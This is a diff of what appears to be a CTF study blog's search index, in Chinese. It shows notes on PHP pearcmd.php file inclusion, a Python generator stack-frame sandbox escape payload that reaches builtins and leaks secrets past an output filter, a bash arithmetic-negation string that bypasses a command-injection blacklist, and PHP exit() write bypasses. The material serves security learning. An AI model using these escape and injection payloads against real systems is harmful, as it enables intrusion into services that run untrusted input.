+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (&#x27;/www/server/php/52/lib/php&#x27; != &#x27;@&#x27;.&#x27;include_path&#x27;.&#x27;@&#x27;) &#123;</span><br><span class="line">    ini_set(&#x27;include_path&#x27;, &#x27;/www/server/php/52/lib/php&#x27;);</span><br><span class="line">    $raw = false;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    // this is a raw, uninstalled pear, either a cvs checkout, or php distro</span><br><span class="line">    $raw = true;</span><br><span class="line">&#125;</span><br><span class="line">define(&#x27;PEAR_RUNTYPE&#x27;, &#x27;pecl&#x27;);</span><br><span class="line">require_once &#x27;pearcmd.php&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>参考文章:<br><code>https://xilitter.github.io/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/index.html</code></p>
+<p><code>https://blog.csdn.net/Mrs_H/article/details/122386511</code></p>
+<p><code>https://y4tacker.github.io/2022/06/19/year/2022/6/%E5%85%B3%E4%BA%8Epearcmd%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</code></p>
+<p><code>https://yuy0ung.github.io/2024/03/27/pearcmd/</code></p>
+]]></content>
+      <categories>
+        <category>php相关漏洞</category>
+        <category>文件包含</category>
+        <category>利用pearcmd.php</category>
+      </categories>
+  </entry>
+  <entry>
     <title>python栈帧逃逸</title>
     <url>/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/</url>
     <content><![CDATA[<h1 id="python栈帧逃逸"><a href="#python栈帧逃逸" class="headerlink" title="python栈帧逃逸"></a>python栈帧逃逸</h1><p>一个挺新的逃逸方式，最近比赛都在考，赶快学习。</p>
@@ -1379,14 +1379,14 @@
 <p>稍微说明一下（个人理解）：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1对应 def f():</span><br><span class="line">    这一部分</span><br><span class="line">    </span><br><span class="line">2就已经通过f()函数里面的f_back进入到了全局变量这一帧</span><br><span class="line">3就可以获得全局变量了。</span><br></pre></td></tr></table></figure>
 
-<p>这里注意：看两个代码代码在3的区别，结合第二串代码如果在改的那里改为<code>frame.f_back.f_back</code>会报错，</p>
+<p>这里注意：看两个代码的output在3的区别，结合第二串代码如果在改的那里改为<code>frame.f_back.f_back</code>会报错，</p>
 <p><strong>可以得出一个结论</strong>：当使用最后一个<code>f_back</code>输出为None时，此时就这个帧已经对应到全局帧，可以直接利用。</p>
 <p><strong>现在来解析一下之前给的示例</strong>，按照我原先的理解，我会认为<code>f_back</code>会多一个，一直想不清楚。向baicany大哥请教了一下，悟了：</p>
 <p><strong>这个<code>exec</code>在执行时会创建一个环境，所以还需要在调用一个<code>f_back</code>逃逸从而去到全局那一帧。</strong></p>
 <p>我们来改一下代码看结果：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def f():</span></span><br><span class="line"><span class="string">    yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">g = f()  #生成器</span></span><br><span class="line"><span class="string">print(&#x27;1:&#x27;)</span></span><br><span class="line"><span class="string">print(g)</span></span><br><span class="line"><span class="string">frame = next(g) #获取到生成器的栈帧对象</span></span><br><span class="line"><span class="string">print(&#x27;2:&#x27;)</span></span><br><span class="line"><span class="string">print(frame)</span></span><br><span class="line"><span class="string">f = frame.f_back</span></span><br><span class="line"><span class="string">print(&#x27;3:&#x27;)</span></span><br><span class="line"><span class="string">print(f)</span></span><br><span class="line"><span class="string">d=f.f_globals[&#x27;s3cret&#x27;]</span></span><br><span class="line"><span class="string">print(&#x27;4:&#x27;)</span></span><br><span class="line"><span class="string">print(d)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">exec</span>(codes)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Output：</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line">&lt;generator <span class="built_in">object</span> f at <span class="number">0x000001DE562387D0</span>&gt;</span><br><span class="line"><span class="number">2</span>:</span><br><span class="line">&lt;frame at <span class="number">0x000001DE56409760</span>, file <span class="string">&#x27;&lt;string&gt;&#x27;</span>, line <span class="number">10</span>, code &lt;module&gt;&gt;</span><br><span class="line"><span class="number">3</span>:</span><br><span class="line">&lt;frame at <span class="number">0x000001DE56409800</span>, file <span class="string">&#x27;D:\\clx\\venv\\haha.py&#x27;</span>, line <span class="number">21</span>, code &lt;module&gt;&gt;</span><br><span class="line"><span class="number">4</span>:</span><br><span class="line">this <span class="keyword">is</span> flag</span><br></pre></td></tr></table></figure>
 
-<p>看结果，可以看出成功出来了，www，本来想到是函数问题了，但在示例中最后那里调用了几个函数我就把这个问题排除了，<strong>exec()特殊</strong>！！！</p>
+<p>看结果，可以看出成功出来了，😭，本来想到是函数问题了，但在示例中最后那里调用了几个函数我就把这个问题排除了，<strong>exec()特殊</strong>！！！</p>
 <h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><h5 id="过滤函数next"><a href="#过滤函数next" class="headerlink" title="过滤函数next()"></a>过滤函数next()</h5><p>即命名空间这样设置：<code>&#123;&#39;__builtins__&#39;: None&#125;</code>，这就导致了内置函数<code>next()</code>不能使用</p>
 <p><strong>（1）</strong>可以使用for循环,这里是采用的列表推导式，如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">next(g) ==&gt; [x for x in g][0]</span><br></pre></td></tr></table></figure>
@@ -1488,7 +1488,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;THIS_IS_SEED&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bad code-operation why still happened ah?&quot;</span>)</span><br></pre></td></tr></table></figure>
 
 <p>这里限制了输出不能有<code>THIS_IS_SEED</code>，所以需要绕过，如何绕过呢</p>
-<p>直接给其他师傅的paylaod，学习一下思路：<br>jay17师傅：</p>
+<p>就是将被禁的字符分开打印出来，使得不会匹配整个字符串，直接给其他师傅的paylaod，学习一下构造方案：<br>jay17师傅：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">scq</span>():</span><br><span class="line">        <span class="keyword">yield</span> scq.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    scq = scq()  <span class="comment">#生成器</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># frame = next(scq)  # 获取到生成器的栈帧对象</span></span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> scq][<span class="number">0</span>] <span class="comment">#由于生成器也是迭代器，所以也可以获取到生成器的栈帧对象</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(frame)</span></span><br><span class="line">    <span class="comment"># print(frame.f_back)</span></span><br><span class="line">    gattr = frame.f_back.f_back.f_back.f_globals[<span class="string">&quot;_&quot;</span>*<span class="number">2</span>+<span class="string">&quot;builtins&quot;</span>+<span class="string">&quot;_&quot;</span>*<span class="number">2</span>]  <span class="comment">#[&#x27;_&#x27;&#x27;_bui&#x27;&#x27;ltins_&#x27;&#x27;_&#x27;]也行</span></span><br><span class="line">    <span class="built_in">dir</span> = gattr.<span class="built_in">dir</span></span><br><span class="line">    <span class="built_in">str</span> = gattr.<span class="built_in">str</span>  <span class="comment"># 获取str方法</span></span><br><span class="line"></span><br><span class="line">    getflag = frame.f_back.f_back.f_back.f_code</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">dir</span>(getflag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>(getflag.co_consts):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
 
 <p>审一下代码，三个点比较重要：</p>
@@ -1608,9 +1608,10 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in 12.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$x</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z0-9;`|#&#x27;\&quot;%&amp;\x09\x0a&gt;&lt;.,?*\-=\\[\]]/i&quot;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$x</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
 
 <p>正好对应这个知识点，构造如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">刚刚好我在学习时构造出了11，这里直接利用</span><br><span class="line">11+1=12 ： $(($((~$(($((~$(())))$((~$(())))))))+$(($((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))))))</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-13取反为12</span><br><span class="line"></span><br><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
 
-<p>刚好这里没有禁+号，直接抓包后传进去即可</p>
+<p>直接抓包后传进去即可</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240610184944008.png" alt="image-20240610184944008"></p>
 <h3 id="利用shell脚本变量构造命令"><a href="#利用shell脚本变量构造命令" class="headerlink" title="利用shell脚本变量构造命令"></a>利用shell脚本变量构造命令</h3><p>这个思路最早提出于2017年34c3CTF里的<a href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">minbashmaxfun</a>，随后2020安洵杯也有<a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EvPQqOQbDkDfg2TD&alichlgref=https://www.bing.com/#toc-2">Web-Bash-Vino0o0o</a></p>
 <p><strong>探姬师傅有个项目应该是可以尝试一把梭的</strong>，好文好项目推送：<code>https://github.com/ProbiusOfficial/bashFuck?tab=readme-ov-file</code></p>
 <p>还有bash的参考手册：<code>https://www.gnu.org/software/bash/manual/bash.html</code></p>
@@ -2892,7 +2893,7 @@
 <p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521202558001.png" alt="image-20240521202558001"></p>
 <p>利用：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521202621401.png" alt="image-20240521202621401"></p>
 <h4 id="代码变形bypass"><a href="#代码变形bypass" class="headerlink" title="代码变形bypass"></a>代码变形bypass</h4><p>对于这个板块的代码可利用的有三种，总结一下(注意融汇贯通，比如下面的<code>convert.iconv*</code>也许也能用于起亚抢矿，注重思考)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一种情况，就是上面说的那种：</span><br><span class="line">file_put_contents($_POST[&#x27;filename&#x27;],&quot;&lt;?php exit();&quot;.$_POST[&#x27;content&#x27;]); </span><br><span class="line"></span><br><span class="line">第二种：相同变量</span><br><span class="line">$content = $GET[&#x27;content&#x27;];</span><br><span class="line">file_put_contents($content,&#x27;&lt;?php exit;&#x27;.$content);</span><br><span class="line"></span><br><span class="line">第三种</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一种情况，就是上面说的那种：</span><br><span class="line">file_put_contents($_POST[&#x27;filename&#x27;],&quot;&lt;?php exit();&quot;.$_POST[&#x27;content&#x27;]); </span><br><span class="line"></span><br><span class="line">第二种：相同变量</span><br><span class="line">$content = $GET[&#x27;content&#x27;];</span><br><span class="line">file_put_contents($content,&#x27;&lt;?php exit;&#x27;.$content);</span><br></pre></td></tr></table></figure>
 
 <p>第一种情况已经在上面已经有比较清楚的说明，先在来说说第二种情况。</p>
 <h5 id="bypass相同变量"><a href="#bypass相同变量" class="headerlink" title="bypass相同变量"></a>bypass相同变量</h5><p>这里对应第二种情况，bypass的方法如下</p>
